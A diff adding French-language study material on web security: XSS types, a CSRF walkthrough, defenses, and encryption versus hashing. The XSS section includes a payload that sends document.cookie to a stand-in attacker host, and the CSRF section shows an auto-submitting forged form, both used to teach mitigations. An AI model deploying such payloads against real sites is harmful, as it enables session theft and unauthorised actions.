@@ -97,6 +97,41 @@ cmd.Parameters.AddWithValue("@email", emailSaisi);
 
 Un ORM comme Entity Framework Core paramètre automatiquement toutes les requêtes.
 
+**Le XSS fait partie d'A03 depuis 2021.** L'injection ne se limite pas au SQL : injecter du JavaScript dans une page est le même mécanisme, avec un autre interpréteur.
+
+**XSS — Cross-Site Scripting**
+
+L'attaquant place du code JavaScript dans une donnée ; le navigateur d'une autre victime l'exécute comme s'il venait du site.
+
+| Type | Où vit la charge | Exemple |
+| --- | --- | --- |
+| **Stocké** (persistant) | En base — servi à tous les visiteurs | Un commentaire contenant `<script>` ; chaque lecteur est touché |
+| **Réfléchi** | Dans l'URL — renvoyé tel quel dans la réponse | `?recherche=<script>…</script>` dans un lien piégé envoyé par e-mail |
+| **DOM** | Uniquement côté client, sans passer par le serveur | Du JS qui écrit `location.hash` dans `innerHTML` |
+
+```javascript
+// L'attaquant saisit ceci comme motif de sa demande de congé :
+<img src=x onerror="fetch('https://attaquant.fr/vol?c='+document.cookie)">
+
+// ❌ Vulnérable : le motif est injecté comme du HTML
+zone.innerHTML = demande.motif;   // → le navigateur exécute onerror
+
+// ✅ Protégé : le motif est traité comme du texte
+zone.textContent = demande.motif; // → affiche les balises littéralement
+```
+
+**Les trois lignes de défense contre le XSS :**
+
+1. **Échapper en sortie** — c'est la protection principale. `textContent` côté JavaScript ; Razor (`@model.Motif`) et les frameworks modernes (React, Vue, Angular) échappent par défaut. La faille revient dès qu'on force le passage : `innerHTML`, `dangerouslySetInnerHTML`, `v-html`, `@Html.Raw`.
+2. **Valider en entrée** — refuser ce qui n'a rien à faire là, et si du HTML riche est réellement nécessaire, le nettoyer avec une bibliothèque dédiée (DOMPurify, HtmlSanitizer) plutôt qu'avec une expression régulière maison.
+3. **Content-Security-Policy** — un en-tête qui interdit au navigateur d'exécuter du script en ligne. C'est le filet quand les deux premières défenses ont laissé passer quelque chose.
+
+```nginx
+add_header Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'" always;
+```
+
+**Pourquoi c'est grave :** un XSS réussi s'exécute avec les droits de la victime. Il peut voler la session, effectuer des actions en son nom, ou réécrire la page pour capturer un mot de passe. Un cookie `HttpOnly` empêche au moins de voler le jeton en JavaScript.
+
 ---
 
 ### A04 — Insecure Design (Conception non sécurisée)
@@ -223,6 +258,93 @@ L'attaquant fait envoyer une requête HTTP par le serveur vers une URL qu'il con
 | Chiffrement réversible (AES) | ❌ Mauvais | Réversible = peut être déchiffré si la clé est volée |
 | MD5 / SHA-1 | ❌ Insuffisant | Trop rapides : millions de tentatives/seconde possibles |
 | bcrypt / Argon2 | ✅ Recommandé | Lents par conception + sel unique = résistants au brute force |
+
+---
+
+### 14.2 CSRF — Cross-Site Request Forgery
+
+Le CSRF est l'inverse exact du XSS : au lieu d'exécuter du code de l'attaquant sur le site légitime, il fait exécuter une **action légitime** par la victime, à son insu, depuis un site tiers.
+
+**Le mécanisme :**
+
+```
+1. Valentin se connecte à congeapp.fr — le navigateur stocke son cookie de session.
+2. Sans se déconnecter, il visite un site piégé.
+3. Ce site contient :
+
+   <form action="https://congeapp.fr/api/demandes/42/valider" method="POST" id="f">
+     <input type="hidden" name="statut" value="VALIDEE">
+   </form>
+   <script>document.getElementById('f').submit();</script>
+
+4. Le navigateur envoie la requête vers congeapp.fr AVEC le cookie de session
+   (il l'attache automatiquement à toute requête vers ce domaine).
+5. Côté serveur, la requête est parfaitement authentifiée. La demande est validée.
+```
+
+L'attaquant n'a pas eu accès au cookie — il n'en a pas eu besoin. Il a simplement profité du fait que **le navigateur joint les cookies tout seul**.
+
+**Les trois protections :**
+
+| Protection | Comment ça marche |
+| --- | --- |
+| **Jeton anti-CSRF** | Le serveur place un jeton aléatoire dans le formulaire et le vérifie à la soumission. Le site tiers ne peut ni le deviner, ni le lire (politique de même origine). |
+| **`SameSite` sur le cookie** | `SameSite=Strict` ou `Lax` empêche le navigateur d'envoyer le cookie sur une requête venue d'un autre site. Défense par défaut des navigateurs modernes. |
+| **En-tête `Authorization`** | Un jeton JWT envoyé dans un en-tête n'est **pas** attaché automatiquement par le navigateur : le code de l'attaquant devrait le lire, ce que la politique de même origine interdit. |
+
+```csharp
+// ASP.NET Core : jeton anti-CSRF sur les actions sensibles
+[HttpPost]
+[ValidateAntiForgeryToken]
+public IActionResult Valider(int id) { /* ... */ }
+
+// Et sur le cookie de session
+options.Cookie.SameSite     = SameSiteMode.Strict;
+options.Cookie.HttpOnly     = true;
+options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
+```
+
+**Le tableau qui résume XSS et CSRF — la question piège du jury :**
+
+| | **XSS** | **CSRF** |
+| --- | --- | --- |
+| Ce qui est injecté | Du code de l'attaquant | Une requête légitime |
+| Qui est trompé | Le **navigateur** de la victime | Le **serveur** |
+| Vecteur | Une donnée non échappée à l'affichage | L'envoi automatique du cookie |
+| Défense principale | Échappement en sortie + CSP | Jeton anti-CSRF + `SameSite` |
+| Le `HttpOnly` aide ? | Oui — le cookie devient illisible en JS | Non — le cookie part quand même |
+
+> Un XSS réussi contourne les protections CSRF : le code s'exécute sur le site lui-même, il peut donc lire le jeton anti-CSRF. C'est pour ça que le XSS est considéré comme le plus grave des deux.
+
+---
+
+### 14.3 Chiffrement, hachage, encodage — trois choses différentes
+
+Confusion fréquente, et question quasi systématique à l'oral.
+
+| Opération | Réversible ? | À quoi ça sert | Exemples |
+| --- | --- | --- | --- |
+| **Encodage** | Oui, sans clé | Transporter une donnée dans un format compatible. **Aucune sécurité.** | base64, URL-encoding |
+| **Chiffrement** | Oui, avec la clé | Rendre une donnée illisible pour qui n'a pas la clé | AES, RSA |
+| **Hachage** | Non | Vérifier sans stocker l'original, contrôler l'intégrité | bcrypt, Argon2, SHA-256 |
+
+Le payload d'un JWT est **encodé** en base64, pas chiffré : n'importe qui peut le lire. La signature garantit qu'il n'a pas été modifié, pas qu'il est secret.
+
+**Symétrique ou asymétrique :**
+
+| | **Symétrique** | **Asymétrique** |
+| --- | --- | --- |
+| Clés | Une seule, partagée | Une paire : publique + privée |
+| Vitesse | Rapide | Lent |
+| Problème | Comment transmettre la clé sans qu'elle soit interceptée | Aucun échange de secret nécessaire |
+| Algorithmes | AES | RSA, ECDSA |
+| Usage | Chiffrer un gros volume de données | Échanger une clé, signer |
+
+**HTTPS combine les deux** — c'est l'exemple à donner : la poignée de main TLS utilise l'asymétrique pour authentifier le serveur (son certificat) et se mettre d'accord sur une clé de session ; toute la suite de la conversation est chiffrée en symétrique, parce que c'est bien plus rapide.
+
+**Et le certificat TLS ?** C'est une clé publique signée par une autorité de certification (Let's Encrypt, par exemple). Le navigateur fait confiance à l'autorité, donc au certificat, donc au serveur.
+
+---
 
 > **📌 À retenir**
 >
